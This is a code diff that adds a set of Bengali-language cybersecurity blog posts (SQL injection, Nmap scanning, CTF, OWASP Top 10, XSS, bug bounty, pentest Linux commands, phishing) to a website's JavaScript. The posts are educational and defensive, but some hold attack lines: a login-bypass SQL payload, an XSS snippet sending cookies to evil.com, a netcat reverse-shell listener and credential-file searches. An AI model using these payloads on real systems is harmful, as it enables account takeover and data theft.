@@ -849,6 +849,297 @@ function renderCerts(){
 function deleteCert(i){certFiles.splice(i,1);localStorage.setItem('ki_certs',JSON.stringify(certFiles));renderCerts();}
 function downloadCert(i){var c=certFiles[i];var a=document.createElement('a');a.href=c.data;a.download=c.name;a.click();}
 
+// ====== BLOG ======
+var BLOGS = [
+  {
+    cat:'Ethical Hacking', icon:'📝', date:'15 Apr 2026', time:'8 min',
+    title:'SQL Injection কী এবং কীভাবে ঠেকাবেন?',
+    body:`<h3>SQL Injection কী?</h3>
+<p>SQL Injection (SQLi) হলো একটি সাইবার আক্রমণ যেখানে হ্যাকার ওয়েবসাইটের input field-এ ক্ষতিকর SQL কোড প্রবেশ করিয়ে ডেটাবেজ নিয়ন্ত্রণ নেওয়ার চেষ্টা করে। এটি OWASP Top 10-এর সবচেয়ে পরিচিত আক্রমণগুলোর একটি।</p>
+<h3>কীভাবে কাজ করে?</h3>
+<p>ধরুন একটি লগিন ফর্মে username হিসেবে টাইপ করা হলো: <code>' OR '1'='1</code> — তাহলে SQL query হয়ে যায়:</p>
+<p><code>SELECT * FROM users WHERE user='' OR '1'='1'</code></p>
+<p>এই query সবসময় সত্য হয়, ফলে পাসওয়ার্ড ছাড়াই লগিন হয়ে যায়।</p>
+<h3>SQL Injection-এর ধরন</h3>
+<ul>
+<li><strong>Classic SQLi</strong> — সরাসরি error message দেখায়</li>
+<li><strong>Blind SQLi</strong> — error দেখায় না, true/false দিয়ে তথ্য বের করে</li>
+<li><strong>Time-based SQLi</strong> — database-কে delay করিয়ে তথ্য বের করে</li>
+<li><strong>Union-based SQLi</strong> — UNION keyword দিয়ে অন্য table-এর data বের করে</li>
+</ul>
+<h3>প্রতিরোধের উপায়</h3>
+<ul>
+<li>✅ <strong>Prepared Statements / Parameterized Queries</strong> ব্যবহার করুন</li>
+<li>✅ <strong>ORM</strong> (Sequelize, Hibernate) ব্যবহার করুন</li>
+<li>✅ সব user input <strong>validate ও sanitize</strong> করুন</li>
+<li>✅ Database user-কে <strong>minimum permission</strong> দিন</li>
+<li>✅ <strong>WAF</strong> (Web Application Firewall) ব্যবহার করুন</li>
+<li>✅ Error message-এ database details <strong>প্রকাশ করবেন না</strong></li>
+</ul>
+<h3>Test করার Tools</h3>
+<p><code>sqlmap</code> <code>Burp Suite</code> <code>Havij</code></p>
+<p>মনে রাখবেন — SQLi test শুধুমাত্র নিজের বা অনুমতিপ্রাপ্ত সিস্টেমে করুন।</p>`
+  },
+  {
+    cat:'Tools', icon:'🔧', date:'02 Apr 2026', time:'10 min',
+    title:'Nmap দিয়ে Network Scanning শুরু করুন',
+    body:`<h3>Nmap কী?</h3>
+<p>Nmap (Network Mapper) হলো সবচেয়ে জনপ্রিয় open-source network scanning tool। এটি দিয়ে network-এর host খোঁজা, open port detect করা, OS fingerprint করা এবং service version জানা যায়।</p>
+<h3>Basic Commands</h3>
+<ul>
+<li><code>nmap 192.168.1.1</code> — single host scan</li>
+<li><code>nmap 192.168.1.0/24</code> — পুরো subnet scan</li>
+<li><code>nmap -p 80,443 192.168.1.1</code> — নির্দিষ্ট port scan</li>
+<li><code>nmap -p- 192.168.1.1</code> — সব 65535 port scan</li>
+<li><code>nmap -sV 192.168.1.1</code> — service version detect</li>
+<li><code>nmap -O 192.168.1.1</code> — OS detection</li>
+<li><code>nmap -A 192.168.1.1</code> — aggressive scan (OS+version+script)</li>
+</ul>
+<h3>Scan Types</h3>
+<ul>
+<li><code>-sS</code> — SYN Stealth Scan (সবচেয়ে popular)</li>
+<li><code>-sU</code> — UDP Scan</li>
+<li><code>-sn</code> — Ping Scan (host discovery only)</li>
+<li><code>-sC</code> — Default NSE scripts চালায়</li>
+</ul>
+<h3>Output Save করা</h3>
+<ul>
+<li><code>nmap -oN result.txt target</code> — Normal format</li>
+<li><code>nmap -oX result.xml target</code> — XML format</li>
+<li><code>nmap -oG result.gnmap target</code> — Grepable format</li>
+</ul>
+<h3>Useful NSE Scripts</h3>
+<p><code>nmap --script vuln target</code> — vulnerability scan</p>
+<p><code>nmap --script http-enum target</code> — web directory enum</p>
+<p><code>nmap --script smb-vuln* target</code> — SMB vulnerabilities</p>
+<h3>⚠️ সতর্কতা</h3>
+<p>Nmap শুধুমাত্র নিজের নেটওয়ার্ক বা written permission আছে এমন নেটওয়ার্কে ব্যবহার করুন। অনুমতি ছাড়া scanning আইনত দণ্ডনীয়।</p>`
+  },
+  {
+    cat:'CTF', icon:'🏆', date:'20 Mar 2026', time:'6 min',
+    title:'CTF-এ Beginners কীভাবে শুরু করবেন',
+    body:`<h3>CTF কী?</h3>
+<p>CTF (Capture The Flag) হলো cybersecurity competition যেখানে বিভিন্ন security challenge সমাধান করে "flag" (একটি string) খুঁজে বের করতে হয়। এটি hacking skills develop করার সেরা উপায়।</p>
+<h3>CTF-এর ধরন</h3>
+<ul>
+<li><strong>Jeopardy</strong> — বিভিন্ন category-র independent challenges</li>
+<li><strong>Attack-Defense</strong> — নিজের সার্ভার রক্ষা করো, অন্যেরটা attack করো</li>
+<li><strong>King of the Hill</strong> — একটি machine নিয়ন্ত্রণে রাখো</li>
+</ul>
+<h3>Common Categories</h3>
+<ul>
+<li>🔐 <strong>Cryptography</strong> — cipher decode, hash crack</li>
+<li>🌐 <strong>Web</strong> — SQLi, XSS, SSRF, LFI</li>
+<li>🔄 <strong>Reverse Engineering</strong> — binary analysis</li>
+<li>💥 <strong>Pwn/Binary Exploitation</strong> — buffer overflow</li>
+<li>🔍 <strong>Forensics</strong> — file analysis, steganography</li>
+<li>🌐 <strong>OSINT</strong> — open source intelligence</li>
+</ul>
+<h3>শুরু করার Platforms</h3>
+<ul>
+<li><strong>PicoCTF</strong> — beginners-দের জন্য সেরা</li>
+<li><strong>HackTheBox</strong> — intermediate থেকে advanced</li>
+<li><strong>TryHackMe</strong> — guided learning path</li>
+<li><strong>CTFtime.org</strong> — upcoming CTF events-এর calendar</li>
+<li><strong>OverTheWire</strong> — Linux basics শেখার জন্য</li>
+</ul>
+<h3>Essential Tools</h3>
+<p><code>Kali Linux</code> <code>Burp Suite</code> <code>Ghidra</code> <code>Wireshark</code> <code>CyberChef</code> <code>John the Ripper</code></p>
+<h3>Tips</h3>
+<ul>
+<li>✅ Google করতে ভয় পাবেন না — writeup পড়ুন</li>
+<li>✅ একটি category-তে focus করুন প্রথমে</li>
+<li>✅ Solve না করতে পারলে hint দেখুন, শিখুন</li>
+<li>✅ Team-এ খেলুন — একা থেকে দ্রুত শেখা যায়</li>
+</ul>`
+  },
+  {
+    cat:'Security', icon:'🔒', date:'05 Mar 2026', time:'12 min',
+    title:'OWASP Top 10 — ২০২৬ আপডেট',
+    body:`<h3>OWASP Top 10 কী?</h3>
+<p>OWASP (Open Web Application Security Project) প্রতি কয়েক বছর পর web application-এর সবচেয়ে critical security risks-এর তালিকা প্রকাশ করে। ২০২৬ সালে updated তালিকা:</p>
+<h3>Top 10 Vulnerabilities</h3>
+<ul>
+<li><strong>A01 — Broken Access Control</strong> — user অনুমতি ছাড়া অন্যের data access করতে পারে</li>
+<li><strong>A02 — Cryptographic Failures</strong> — দুর্বল encryption, plaintext password storage</li>
+<li><strong>A03 — Injection</strong> — SQL, NoSQL, OS, LDAP injection</li>
+<li><strong>A04 — Insecure Design</strong> — design পর্যায়ে security না ভাবা</li>
+<li><strong>A05 — Security Misconfiguration</strong> — default credentials, unnecessary features enabled</li>
+<li><strong>A06 — Vulnerable Components</strong> — পুরনো library বা dependency ব্যবহার</li>
+<li><strong>A07 — Auth Failures</strong> — weak password, no MFA, session hijacking</li>
+<li><strong>A08 — Software & Data Integrity</strong> — CI/CD pipeline attack, unsigned updates</li>
+<li><strong>A09 — Logging Failures</strong> — security events log না করা</li>
+<li><strong>A10 — SSRF</strong> — Server-Side Request Forgery</li>
+</ul>
+<h3>সবচেয়ে বেশি দেখা যায়</h3>
+<p>Real-world bug bounty ও pentest-এ সবচেয়ে বেশি পাওয়া যায়: <strong>Broken Access Control, Injection, Auth Failures</strong>।</p>
+<h3>Developer-দের করণীয়</h3>
+<ul>
+<li>✅ Input validation সব জায়গায়</li>
+<li>✅ HTTPS enforce করুন</li>
+<li>✅ Dependencies নিয়মিত update করুন</li>
+<li>✅ Least privilege principle follow করুন</li>
+<li>✅ Security testing CI/CD-এ যোগ করুন</li>
+</ul>`
+  },
+  {
+    cat:'Web Security', icon:'🕷️', date:'28 Apr 2026', time:'9 min',
+    title:'XSS Attack কী? কীভাবে ওয়েবসাইট সুরক্ষিত রাখবেন',
+    body:`<h3>XSS কী?</h3>
+<p>XSS (Cross-Site Scripting) হলো এমন একটি attack যেখানে attacker ওয়েবসাইটে malicious JavaScript inject করে অন্য user-দের browser-এ execute করায়। এটি session hijacking, credential theft এবং malware distribution-এ ব্যবহার হয়।</p>
+<h3>XSS-এর ধরন</h3>
+<ul>
+<li><strong>Reflected XSS</strong> — URL parameter-এ script থাকে, server reflect করে</li>
+<li><strong>Stored XSS</strong> — database-এ script save হয়, সবার browser-এ চলে (সবচেয়ে বিপজ্জনক)</li>
+<li><strong>DOM-based XSS</strong> — client-side JavaScript দ্বারা DOM manipulate হয়</li>
+</ul>
+<h3>Simple Example</h3>
+<p>একটি search box-এ যদি input sanitize না হয়:</p>
+<p><code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code></p>
+<p>এই code টি victim-এর cookie চুরি করে attacker-এর server-এ পাঠাবে।</p>
+<h3>প্রতিরোধ</h3>
+<ul>
+<li>✅ সব output <strong>HTML encode</strong> করুন (<code>&amp;lt;</code>, <code>&amp;amp;</code> ইত্যাদি)</li>
+<li>✅ <strong>Content Security Policy (CSP)</strong> header set করুন</li>
+<li>✅ <strong>HttpOnly ও Secure</strong> cookie flag ব্যবহার করুন</li>
+<li>✅ <strong>DOMPurify</strong> বা similar library দিয়ে sanitize করুন</li>
+<li>✅ <code>innerHTML</code> এর বদলে <code>textContent</code> ব্যবহার করুন</li>
+<li>✅ User input কখনো directly render করবেন না</li>
+</ul>
+<h3>Testing Tools</h3>
+<p><code>Burp Suite</code> <code>XSSer</code> <code>OWASP ZAP</code> <code>DalFox</code></p>`
+  },
+  {
+    cat:'Bug Bounty', icon:'🐛', date:'22 Apr 2026', time:'15 min',
+    title:'Bug Bounty শুরু করার সম্পূর্ণ গাইড — ২০২৬',
+    body:`<h3>Bug Bounty কী?</h3>
+<p>Bug Bounty হলো এমন একটি program যেখানে কোম্পানি তাদের product-এর vulnerability খুঁজে দিলে researcher-কে পুরস্কার দেয়। Google, Facebook, Microsoft সহ হাজারো কোম্পানি এই program পরিচালনা করে।</p>
+<h3>শুরু করার আগে যা শিখতে হবে</h3>
+<ul>
+<li>🌐 Web technologies: HTML, CSS, JavaScript, HTTP/HTTPS</li>
+<li>🗄️ Database basics: SQL</li>
+<li>🔐 Common vulnerabilities: OWASP Top 10</li>
+<li>🛠️ Tools: Burp Suite, nmap, ffuf, nuclei</li>
+<li>🐧 Linux command line basics</li>
+</ul>
+<h3>Best Platforms</h3>
+<ul>
+<li><strong>HackerOne</strong> — সবচেয়ে বড় platform, বাংলাদেশি researchers active</li>
+<li><strong>Bugcrowd</strong> — corporate programs বেশি</li>
+<li><strong>Intigriti</strong> — European companies</li>
+<li><strong>Synack</strong> — invite-only, বেশি payment</li>
+<li><strong>Open Bug Bounty</strong> — শুরু করার জন্য ভালো</li>
+</ul>
+<h3>Step-by-Step শুরু করুন</h3>
+<ul>
+<li>1️⃣ TryHackMe ও PortSwigger Web Academy-তে practice করুন</li>
+<li>2️⃣ HackerOne-এ free program দিয়ে শুরু করুন</li>
+<li>3️⃣ Scope ভালোভাবে পড়ুন — out-of-scope report করলে ban হতে পারে</li>
+<li>4️⃣ Duplicate avoid করতে আগের reports পড়ুন</li>
+<li>5️⃣ Clear ও professional report লিখুন</li>
+</ul>
+<h3>Earnings</h3>
+<p>বাংলাদেশ থেকে top researchers প্রতি মাসে $500–$10,000+ আয় করছেন। Critical vulnerability-র জন্য $50,000 পর্যন্ত bounty দেওয়া হয়।</p>
+<h3>Pro Tips</h3>
+<ul>
+<li>✅ একটি vulnerability type-এ expert হোন</li>
+<li>✅ New program launch-এ তাড়াতাড়ি রিপোর্ট করুন</li>
+<li>✅ Automation শিখুন (subfinder, httpx, nuclei)</li>
+<li>✅ Twitter/X-এ security researchers follow করুন</li>
+</ul>`
+  },
+  {
+    cat:'Linux', icon:'🐧', date:'10 Apr 2026', time:'11 min',
+    title:'Penetration Testing-এর জন্য Linux কমান্ড — Top 30',
+    body:`<h3>কেন Linux?</h3>
+<p>Penetration Testing-এর জন্য Kali Linux বা Parrot OS ব্যবহার করা হয় কারণ এগুলোতে 600+ security tool pre-installed থাকে এবং Linux terminal অত্যন্ত শক্তিশালী।</p>
+<h3>Network Commands</h3>
+<ul>
+<li><code>ifconfig / ip a</code> — network interface দেখুন</li>
+<li><code>netstat -tulpn</code> — open ports দেখুন</li>
+<li><code>ping target</code> — host alive কিনা চেক করুন</li>
+<li><code>traceroute target</code> — route trace করুন</li>
+<li><code>curl -I url</code> — HTTP header দেখুন</li>
+<li><code>wget url</code> — file download করুন</li>
+</ul>
+<h3>File System</h3>
+<ul>
+<li><code>find / -name "*.conf" 2>/dev/null</code> — config file খুঁজুন</li>
+<li><code>grep -r "password" /etc/</code> — password string খুঁজুন</li>
+<li><code>ls -la</code> — hidden file সহ সব দেখুন</li>
+<li><code>cat /etc/passwd</code> — user list দেখুন</li>
+<li><code>chmod +x file.sh</code> — execute permission দিন</li>
+</ul>
+<h3>Process & System</h3>
+<ul>
+<li><code>ps aux</code> — running process দেখুন</li>
+<li><code>top / htop</code> — real-time resource monitor</li>
+<li><code>uname -a</code> — kernel version দেখুন</li>
+<li><code>whoami</code> — current user দেখুন</li>
+<li><code>sudo -l</code> — sudo permissions দেখুন</li>
+<li><code>crontab -l</code> — scheduled tasks দেখুন</li>
+</ul>
+<h3>Useful Hacking Commands</h3>
+<ul>
+<li><code>nc -lvnp 4444</code> — netcat listener (reverse shell receive)</li>
+<li><code>python3 -m http.server 8080</code> — quick web server</li>
+<li><code>ssh user@ip</code> — SSH connect</li>
+<li><code>scp file user@ip:/path</code> — secure file copy</li>
+<li><code>tcpdump -i eth0 port 80</code> — packet capture</li>
+</ul>
+<h3>Privilege Escalation Check</h3>
+<p><code>id</code> <code>sudo -l</code> <code>find / -perm -4000 2>/dev/null</code> (SUID files) — এই commands দিয়ে privesc vector খোঁজুন।</p>`
+  },
+  {
+    cat:'Social Engineering', icon:'🎭', date:'01 Apr 2026', time:'7 min',
+    title:'Phishing Attack চেনার উপায় ও প্রতিরোধ',
+    body:`<h3>Phishing কী?</h3>
+<p>Phishing হলো social engineering attack-এর সবচেয়ে সাধারণ ধরন। attacker ব্যাংক, Google বা Facebook-এর মতো বিশ্বস্ত সংস্থার ছদ্মবেশে email বা message পাঠিয়ে ব্যক্তিগত তথ্য চুরি করে।</p>
+<h3>Phishing-এর ধরন</h3>
+<ul>
+<li><strong>Email Phishing</strong> — fake email দিয়ে malicious link পাঠানো</li>
+<li><strong>Spear Phishing</strong> — নির্দিষ্ট ব্যক্তিকে target করে personalized attack</li>
+<li><strong>Smishing</strong> — SMS-এর মাধ্যমে phishing</li>
+<li><strong>Vishing</strong> — phone call-এর মাধ্যমে তথ্য নেওয়া</li>
+<li><strong>Clone Phishing</strong> — real email-এর exact copy তৈরি করে link change করা</li>
+</ul>
+<h3>Phishing চেনার উপায়</h3>
+<ul>
+<li>🔍 Sender-এর email address মনোযোগ দিয়ে দেখুন (<code>support@g00gle.com</code> ≠ Google)</li>
+<li>🔍 Link-এ hover করুন — real URL দেখুন click করার আগে</li>
+<li>🔍 জরুরি ভাষা বা ভয় দেখানো ("আপনার account বন্ধ হবে!") সন্দেহজনক</li>
+<li>🔍 Grammar ও spelling mistakes দেখুন</li>
+<li>🔍 SSL certificate চেক করুন — <code>https://</code> থাকলেই safe না</li>
+</ul>
+<h3>প্রতিরোধের উপায়</h3>
+<ul>
+<li>✅ <strong>Multi-Factor Authentication (MFA)</strong> সব জায়গায় চালু রাখুন</li>
+<li>✅ কোনো link-এ click করার আগে URL ভালোভাবে দেখুন</li>
+<li>✅ Password Manager ব্যবহার করুন — ভুল site-এ fill করবে না</li>
+<li>✅ Email filter ও anti-phishing tool ব্যবহার করুন</li>
+<li>✅ কখনো email-এ পাসওয়ার্ড বা OTP শেয়ার করবেন না</li>
+<li>✅ Suspicious link VirusTotal.com-এ check করুন</li>
+</ul>
+<h3>বাংলাদেশে সাধারণ Phishing</h3>
+<p>bKash, Nagad, ব্যাংক এবং government portal-এর নামে phishing সবচেয়ে বেশি। অজানা number থেকে OTP চাইলে কখনো দেবেন না।</p>`
+  }
+];
+
+function openBlog(idx){
+  var b=BLOGS[idx];
+  if(!b)return;
+  document.getElementById('bmCat').textContent=b.cat;
+  document.getElementById('bmTitle').textContent=b.title;
+  document.getElementById('bmMeta').textContent=b.date+' · '+b.time+' read';
+  document.getElementById('bmBody').innerHTML=b.body;
+  document.getElementById('blogOverlay').style.display='flex';
+  document.body.style.overflow='hidden';
+}
+function closeBlog(){
+  document.getElementById('blogOverlay').style.display='none';
+  document.body.style.overflow='';
+}
+
 // ====== TOAST ======
 function showToast(type,ic,msg,duration){
   duration=duration||3500;
